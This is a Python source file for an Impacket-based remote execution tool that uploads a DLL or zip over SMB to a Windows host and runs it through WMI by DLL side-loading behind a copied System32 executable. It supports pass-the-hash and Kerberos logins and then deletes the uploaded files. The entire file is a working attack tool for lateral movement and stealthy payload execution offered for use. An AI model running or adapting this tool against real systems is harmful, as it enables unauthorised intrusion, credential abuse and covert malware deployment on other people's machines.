#!/usr/bin/env python3
#
# Author: @icyguider (Matthew David)
#
#   Dependencies: Impacket
#
# Yoinked and modified for zip file execution - choi 

import argparse
import random
import string
import subprocess
import base64, gzip, time, os, stat, sys
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.ndr import NULL
from six import PY2

CODEC = sys.stdout.encoding

class DLLProxyExec:
    def __init__(self, target_host='', username='', password='', domain='', nthash='', doKerberos=False, kdcHost=None, remotePath=None, zipdir='', output=None):
        self.__target_host = target_host
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = nthash
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__remoteShare = f'{remotePath.split(":")[0]}$'
        self.__remotePath = remotePath.split(":")[1]
        self.__zipdir = zipdir
        self.__outputBuffer = ''
        self.__smbclient = None
        self.__output = output
        self.__execOutFile = ''.join(random.choice(string.ascii_uppercase) for i in range(4)) + ''.join(random.choice(string.digits) for i in range(4)) + ".tmp"

        # self.__execOutFile = 'DAB3084.tmp' # should prolly dynamically generate this

    def login(self):
        self.__smbclient = SMBConnection(self.__target_host, self.__target_host)

        if self.__doKerberos == False:
            self.__smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        else:
            self.__smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost)

    def upload(self, infile, outfile):
        self.login()

        with open(infile, "rb") as p:
            self.__smbclient.putFile(self.__remoteShare, f"{self.__remotePath}\\{outfile}", p.read)
        self.__smbclient.close()

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                print('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
                              'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        self.login()

        while True:
            try:
                self.__smbclient.getFile(self.__remoteShare, f"{self.__remotePath}\\{self.__execOutFile}", output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__smbclient.reconnect()
                    return self.get_output()
        self.__smbclient.deleteFile(self.__remoteShare, f"{self.__remotePath}\\{self.__execOutFile}")
        self.__smbclient.close()

    def execute(self, data):
        dcom = DCOMConnection(self.__target_host, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              None, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process, _ = iWbemServices.GetObject('Win32_Process')
            pwd = f"{self.__remoteShare[:-1]}:{self.__remotePath}\\"

            shell = "cmd.exe /Q /c "
            command = shell + data
            if self.__output == True:
                command += ' 1> ' + '\\\\127.0.0.1\\' + self.__remoteShare + f'{self.__remotePath}\\{self.__execOutFile} 2>&1'

            if PY2:
                win32Process.Create(command.decode(sys.stdin.encoding), pwd, None)
            else:
                win32Process.Create(command, pwd, None)

            if self.__output == True:
                self.get_output()

        except (Exception, KeyboardInterrupt) as e:
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        dcom.disconnect()
        return self.__outputBuffer

    # Going to add some zip logic here 
    def run(self, file, exe, zipfile):
        drive = self.__remoteShare[:-1]

        # Single DLL file logic 
        if zipfile == '': 
            # Single DLL file logic 
            print("[SMB] Uploading DLL wrapper...")
            self.upload(file, file)

            print("[WMI] Executing DLL...")
            out = self.execute(f"copy {drive}:\\Windows\\System32\\{exe} .\\ && .\\{exe}")

            print("[WMI] Cleaning up files...")
            self.execute(f"del {drive}:{self.__remotePath}\\{exe} && del {drive}:{self.__remotePath}\\{file}")

        else: 
            print("[DEBUG] Zip file triggered!")
            zipdirname,_ = os.path.splitext(zipfile)
            full_zipfilepath = f"{drive}:{self.__remotePath}\\{zipfile}"
            full_zipdirpath = f"{drive}:{self.__remotePath}\\{zipdirname}"
            
            print("\n[SMB] Uploading zip file...") 
            self.upload(zipfile, zipfile) 
            print(f"[SMB] Uploaded to: {full_zipfilepath}")

            print("\n[WMI] Extracting zip file from remote host...") 
            self.execute(f"powershell.exe -c Expand-Archive -Path {full_zipfilepath} -DestinationPath {full_zipdirpath} -Force")
            print(f"[WMI] Extracted to: {full_zipdirpath}")

            print("\n[WMI] Executing DLL...")
            out = self.execute(f"copy {drive}:\\Windows\\System32\\{exe} {full_zipdirpath}\\ && {full_zipdirpath}\\{exe}")

            print("\n[WMI] Cleaning up files...")
            self.execute(f"del {full_zipfilepath} && rmdir /s /q {full_zipdirpath}")
            print(f"[WMI] Deleted: {full_zipfilepath} and {full_zipdirpath}")

        if self.__output:
            print(f"\n[*] Output:\n {out}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Execute file via DLL proxying on a remote host.")
    parser.add_argument("target", help="[[domain/]username[:password]@]<hostname or address>", type=str)
    parser.add_argument('-f', '-file', dest='file', help='DLL file to execute', metavar='file', default='')
    parser.add_argument('-z', '-zip', dest='zipfile', help='Zip file from bin2sideload', metavar='zipfile', default='')
    parser.add_argument('-e', '-exe', dest='exe', help='System32 EXE used to execute DLL file', metavar='exe', default='')
    parser.add_argument('-output', action="store_true", help='Attempt to get output')
    group = parser.add_argument_group('authentication')
    group.add_argument('-H', '-hash', dest='hash', help='NTHash for login via PtH', metavar='hash', default='')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication with credentials from the KRB5CCNAME ccache file')
    group.add_argument('-dc-ip', dest='dc_ip', help='IP Address of the domain controller (useful for Kerberos auth)', metavar='IPAddress')
    parser.add_argument('-rp', '-remote-path', dest='remotePath', help='The remote path to write files to (Default: C:\\Windows\\Tasks)', metavar='remotePath', default="C:\\Windows\\Tasks\\")
    if len(sys.argv) == 1:
        parser.print_help()
        exit()
    args = parser.parse_args()
    username = ""
    password = ""
    domain = ""
    nthash = ""
    nthash = args.hash
    domain, username, password, target = parse_target(args.target)

    if args.k == True:
        domain = ""
    if password == '' and username != '' and args.hash == "" and args.k == False:
        from getpass import getpass
        password = getpass("[+] Password: ")
    if args.remotePath[-1] == "\\":
        rpath = args.remotePath[:-1]
    else:
        rpath = args.remotePath
    try:
        proxyexec = DLLProxyExec(target, username, password, domain, nthash, args.k, args.dc_ip, rpath, args.zipfile, args.output)
        proxyexec.run(args.file, args.exe, args.zipfile)
    except Exception as e:
        if "STATUS_ACCESS_DENIED" in str(e):
            print(
                f"[!] The user {domain}\\{username} is not local administrator on this system"
            )
        elif "STATUS_LOGON_FAILURE" in str(e):
            print(
                f"[!] The provided credentials for the user '{domain}\\{username}' are invalid or the user does not exist"
            )
        else:
            print(f"[!] Some failure happened: ({str(e)})")
        raise Exception